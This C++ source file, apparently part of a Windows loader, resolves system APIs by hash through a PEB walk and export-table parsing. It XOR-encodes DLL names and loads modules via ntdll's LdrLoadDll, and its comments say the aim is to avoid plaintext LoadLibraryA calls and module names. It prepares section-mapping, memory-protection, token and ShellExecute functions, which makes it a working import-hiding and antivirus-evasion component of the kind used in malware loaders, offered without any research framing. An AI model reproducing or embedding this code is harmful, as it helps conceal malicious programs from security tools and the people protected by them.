// ApiHash.cpp
#include "stdafx.h"
#include "ApiHash.h"

DWORD HashApiString(const char* str)
{
    DWORD hash = 0x811c9dc5;
    while (*str) { hash ^= (BYTE)(*str++); hash *= 0x01000193; }
    return hash;
}

static DWORD HashApiStringI(const char* str)
{
    DWORD hash = 0x811c9dc5;
    while (*str) {
        char c = *str++;
        if (c >= 'A' && c <= 'Z') c += 32;
        hash ^= (BYTE)c; hash *= 0x01000193;
    }
    return hash;
}

// 自定义 LDR 结构（新 SDK winternl.h 中为不透明结构，无法直接取成员）
typedef struct _MY_LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID      DllBase;
    PVOID      EntryPoint;
    ULONG      SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG      Flags;
    USHORT     LoadCount;
    USHORT     TlsIndex;
    union {
        LIST_ENTRY HashLinks;
        struct { PVOID SectionPointer; ULONG CheckSum; };
    };
    union { ULONG TimeDateStamp; PVOID LoadedImports; };
    PVOID EntryPointActivationContext;
    PVOID PatchInformation;
} MY_LDR_DATA_TABLE_ENTRY;

HMODULE GetModuleByHash(DWORD modHash)
{
#ifdef _WIN64
    PPEB peb = (PPEB)__readgsqword(0x60);
#else
    PPEB peb = (PPEB)__readfsdword(0x30);
#endif
    PPEB_LDR_DATA ldr = (PPEB_LDR_DATA)peb->Ldr;
    LIST_ENTRY* head = &ldr->InMemoryOrderModuleList;
    LIST_ENTRY* cur = head->Flink;

    while (cur != head)
    {
        MY_LDR_DATA_TABLE_ENTRY* entry = CONTAINING_RECORD(cur, MY_LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (entry->BaseDllName.Buffer && entry->BaseDllName.Length > 0)
        {
            char nameA[256] = {0};
            int len = entry->BaseDllName.Length / sizeof(WCHAR);
            if (len > 255) len = 255;
            for (int i = 0; i < len; i++) nameA[i] = (char)entry->BaseDllName.Buffer[i];
            if (HashApiStringI(nameA) == modHash) return (HMODULE)entry->DllBase;
        }
        cur = cur->Flink;
    }
    return NULL;
}

// 解析导出转发器（真实模块名转发 / API-set 虚拟名转发）
static FARPROC ResolveForwarder(BYTE* base, DWORD fnRva)
{
    const char* fwd = (const char*)(base + fnRva);
    const char* dot = strchr(fwd, '.');
    if (!dot) return NULL;
    DWORD len = (DWORD)(dot - fwd);
    if (len == 0 || len >= 260) return NULL;
    char modFile[268];
    memcpy(modFile, fwd, len);
    modFile[len] = 0;
    const char* fn = dot + 1;
    if (!strchr(modFile, '.')) { memcpy(modFile + len, ".dll", 5); }

    HMODULE hFwd = GetModuleByHash(HashApiStringI(modFile));

    if (!hFwd) {
        LdrLoadDllT pLdr = pLdrLoadDll;
        if (!pLdr) {
            HMODULE nt = GetModuleByHash(HM_ntdll_dll);
            if (nt) pLdr = (LdrLoadDllT)GetProcByHash(nt, H_LdrLoadDll);
        }
        if (pLdr) {
            WCHAR wname[260] = {0};
            for (int k = 0; modFile[k] && k < 259; k++) wname[k] = (WCHAR)modFile[k];
            UNICODE_STRING us;
            us.Buffer = wname;
            us.Length = (USHORT)(wcslen(wname) * sizeof(WCHAR));
            us.MaximumLength = us.Length + sizeof(WCHAR);
            HANDLE h = NULL;
            if (NT_SUCCESS(pLdr(NULL, NULL, &us, &h)) && h) hFwd = (HMODULE)h;
        }
    }
    if (!hFwd) return NULL;

    if (fn[0] == '#') {
        int ord = 0;
        for (const char* p = fn + 1; *p; p++)
            if (*p >= '0' && *p <= '9') ord = ord * 10 + (*p - '0');
        if (ord > 0 && ord < 65536) return GetProcByOrdinal(hFwd, (WORD)ord);
        return NULL;
    }
    return GetProcByHash(hFwd, HashApiString(fn));
}

FARPROC GetProcByHash(HMODULE hMod, DWORD funcHash)
{
    if (!hMod) return NULL;
    BYTE* base = (BYTE*)hMod;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;

    DWORD expRva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    DWORD expSize = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
    if (!expRva) return NULL;

    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)(base + expRva);
    DWORD* names = (DWORD*)(base + exp->AddressOfNames);
    WORD* ordinals = (WORD*)(base + exp->AddressOfNameOrdinals);
    DWORD* funcs = (DWORD*)(base + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++)
    {
        const char* name = (const char*)(base + names[i]);
        if (HashApiString(name) == funcHash)
        {
            DWORD fnRva = funcs[ordinals[i]];
            if (fnRva >= expRva && fnRva < expRva + expSize) {
                return ResolveForwarder(base, fnRva);
            }
            return (FARPROC)(base + fnRva);
        }
    }
    return NULL;
}

// 按导出表序号解析函数（处理 WS2_32 序号导入）
FARPROC GetProcByOrdinal(HMODULE hMod, WORD ordinal)
{
    if (!hMod) return NULL;
    BYTE* base = (BYTE*)hMod;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;

    DWORD expRva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    DWORD expSize = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
    if (!expRva) return NULL;

    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)(base + expRva);
    DWORD baseOrd = exp->Base;
    if (ordinal < baseOrd) return NULL;
    DWORD idx = (DWORD)ordinal - baseOrd;
    if (idx >= exp->NumberOfFunctions) return NULL;

    DWORD* funcs = (DWORD*)(base + exp->AddressOfFunctions);
    DWORD fnRva = funcs[idx];
    if (fnRva >= expRva && fnRva < expRva + expSize) {
        return ResolveForwarder(base, fnRva);
    }
    return (FARPROC)(base + fnRva);
}

static HMODULE g_kernel32 = NULL, g_user32 = NULL;
static HMODULE g_shell32 = NULL, g_advapi32 = NULL, g_ntdll = NULL;

HMODULE GetKernel32() { if (!g_kernel32) g_kernel32 = GetModuleByHash(HM_kernel32_dll); return g_kernel32; }
HMODULE GetUser32()   { if (!g_user32)   g_user32   = GetModuleByHash(HM_user32_dll);   return g_user32; }
HMODULE GetShell32()  { if (!g_shell32)  g_shell32  = GetModuleByHash(HM_shell32_dll);  return g_shell32; }
HMODULE GetAdvApi32() { if (!g_advapi32) g_advapi32 = GetModuleByHash(HM_advapi32_dll); return g_advapi32; }
HMODULE GetNtdll()    { if (!g_ntdll)    g_ntdll    = GetModuleByHash(HM_ntdll_dll);    return g_ntdll; }

// ---------- 全局函数指针定义 ----------
CreateFileAT          pCreateFileA          = NULL;
CloseHandleT          pCloseHandle          = NULL;
VirtualProtectT       pVirtualProtect       = NULL;
FreeLibraryT          pFreeLibrary          = NULL;
GetProcessHeapT       pGetProcessHeap       = NULL;
HeapAllocT            pHeapAlloc            = NULL;
HeapFreeT             pHeapFree             = NULL;
IsBadReadPtrT         pIsBadReadPtr         = NULL;
SleepT                pSleep                = NULL;
GetCurrentProcessT    pGetCurrentProcess    = NULL;
GetModuleFileNameAT   pGetModuleFileNameA   = NULL;
GetEnvironmentVariableAT pGetEnvironmentVariableA = NULL;
GetTickCountT         pGetTickCount         = NULL;
OpenProcessTokenT     pOpenProcessToken     = NULL;
GetTokenInformationT  pGetTokenInformation  = NULL;
ShellExecuteAT        pShellExecuteA        = NULL;
NtCreateSectionT        pNtCreateSection        = NULL;
NtMapViewOfSectionT     pNtMapViewOfSection     = NULL;
NtUnmapViewOfSectionT   pNtUnmapViewOfSection   = NULL;
NtCloseT                pNtClose                = NULL;
NtAllocateVirtualMemoryT pNtAllocateVirtualMemory = NULL;
NtProtectVirtualMemoryT pNtProtectVirtualMemory = NULL;
NtFreeVirtualMemoryT    pNtFreeVirtualMemory    = NULL;
LdrLoadDllT             pLdrLoadDll             = NULL;

// 模块名异或字节（XOR_KEY=0x5A），运行时解密为窄串再转宽字符
static const unsigned char encMod_ws2_32[10]  = { 0x2D,0x29,0x68,0x05,0x69,0x68,0x74,0x3E,0x36,0x36 };
static const unsigned char encMod_user32[10]  = { 0x2F,0x29,0x3F,0x28,0x69,0x68,0x74,0x3E,0x36,0x36 };
static const unsigned char encMod_shell32[11] = { 0x29,0x32,0x3F,0x36,0x36,0x69,0x68,0x74,0x3E,0x36,0x36 };
static const unsigned char encMod_advapi32[12]= { 0x3B,0x3E,0x2C,0x3B,0x2A,0x33,0x69,0x68,0x74,0x3E,0x36,0x36 };

// 通过 ntdll!LdrLoadDll 加载模块（避免明文 LoadLibraryA / 明文宽模块名）
static HMODULE LoadModuleHidden(const unsigned char* encName, int nameLen)
{
    HMODULE ntdll = GetNtdll();
    if (!ntdll) return NULL;
    if (!pLdrLoadDll)
        pLdrLoadDll = (LdrLoadDllT)GetProcByHash(ntdll, H_LdrLoadDll);
    if (!pLdrLoadDll) return NULL;
    if (nameLen <= 0 || nameLen > 63) return NULL;

    char narrow[64] = {0};
    XorDecode(narrow, encName, nameLen, XOR_KEY);

    WCHAR wname[64] = {0};
    for (int i = 0; i < nameLen; i++) wname[i] = (WCHAR)narrow[i];

    UNICODE_STRING us;
    us.Buffer = wname;
    us.Length = (USHORT)(nameLen * sizeof(WCHAR));
    us.MaximumLength = us.Length + sizeof(WCHAR);

    HANDLE h = NULL;
    NTSTATUS st = pLdrLoadDll(NULL, NULL, &us, &h);
    return NT_SUCCESS(st) ? (HMODULE)h : NULL;
}

// 按哈希隐藏加载模块（先查 PEB，未加载则用异或名 LdrLoadDll）
HMODULE LoadModuleByHash(DWORD modHash)
{
    HMODULE h = GetModuleByHash(modHash);
    if (h) return h;
    if (modHash == HM_ws2_32_dll)
        return LoadModuleHidden(encMod_ws2_32, (int)sizeof(encMod_ws2_32));
    if (modHash == HM_user32_dll)
        return LoadModuleHidden(encMod_user32, (int)sizeof(encMod_user32));
    if (modHash == HM_shell32_dll)
        return LoadModuleHidden(encMod_shell32, (int)sizeof(encMod_shell32));
    if (modHash == HM_advapi32_dll)
        return LoadModuleHidden(encMod_advapi32, (int)sizeof(encMod_advapi32));
    return NULL;
}

void InitNtdllApis()
{
    HMODULE ntdll = GetNtdll();
    if (!ntdll) return;
    pNtCreateSection         = (NtCreateSectionT)        GetProcByHash(ntdll, H_NtCreateSection);
    pNtMapViewOfSection      = (NtMapViewOfSectionT)     GetProcByHash(ntdll, H_NtMapViewOfSection);
    pNtUnmapViewOfSection    = (NtUnmapViewOfSectionT)  GetProcByHash(ntdll, H_NtUnmapViewOfSection);
    pNtClose                 = (NtCloseT)                GetProcByHash(ntdll, H_NtClose);
    pNtAllocateVirtualMemory = (NtAllocateVirtualMemoryT)GetProcByHash(ntdll, H_NtAllocateVirtualMemory);
    pNtProtectVirtualMemory  = (NtProtectVirtualMemoryT) GetProcByHash(ntdll, H_NtProtectVirtualMemory);
    pNtFreeVirtualMemory     = (NtFreeVirtualMemoryT)    GetProcByHash(ntdll, H_NtFreeVirtualMemory);
    pLdrLoadDll              = (LdrLoadDllT)             GetProcByHash(ntdll, H_LdrLoadDll);
}

void InitApiHash()
{
    // 按需加载尚未加载的模块（模块名运行时异或还原）
    if (!GetUser32())   LoadModuleByHash(HM_user32_dll);
    if (!GetShell32())  LoadModuleByHash(HM_shell32_dll);
    if (!GetAdvApi32()) LoadModuleByHash(HM_advapi32_dll);

    HMODULE k32 = GetKernel32();
    pCreateFileA          = (CreateFileAT)          GetProcByHash(k32, H_CreateFileA);
    pCloseHandle          = (CloseHandleT)          GetProcByHash(k32, H_CloseHandle);
    pVirtualProtect       = (VirtualProtectT)       GetProcByHash(k32, H_VirtualProtect);
    pFreeLibrary          = (FreeLibraryT)          GetProcByHash(k32, H_FreeLibrary);
    pGetProcessHeap       = (GetProcessHeapT)       GetProcByHash(k32, H_GetProcessHeap);
    pHeapAlloc            = (HeapAllocT)            GetProcByHash(k32, H_HeapAlloc);
    pHeapFree             = (HeapFreeT)             GetProcByHash(k32, H_HeapFree);
    pIsBadReadPtr         = (IsBadReadPtrT)         GetProcByHash(k32, H_IsBadReadPtr);
    pSleep                = (SleepT)                GetProcByHash(k32, H_Sleep);
    pGetCurrentProcess    = (GetCurrentProcessT)    GetProcByHash(k32, H_GetCurrentProcess);
    pGetModuleFileNameA   = (GetModuleFileNameAT)   GetProcByHash(k32, H_GetModuleFileNameA);
    pGetEnvironmentVariableA = (GetEnvironmentVariableAT)GetProcByHash(k32, H_GetEnvironmentVariableA);
    pGetTickCount         = (GetTickCountT)         GetProcByHash(k32, H_GetTickCount);

    HMODULE adv = GetAdvApi32();
    pOpenProcessToken    = (OpenProcessTokenT)    GetProcByHash(adv, H_OpenProcessToken);
    pGetTokenInformation = (GetTokenInformationT) GetProcByHash(adv, H_GetTokenInformation);

    HMODULE sh = GetShell32();
    pShellExecuteA = (ShellExecuteAT)GetProcByHash(sh, H_ShellExecuteA);

    InitNtdllApis();
}
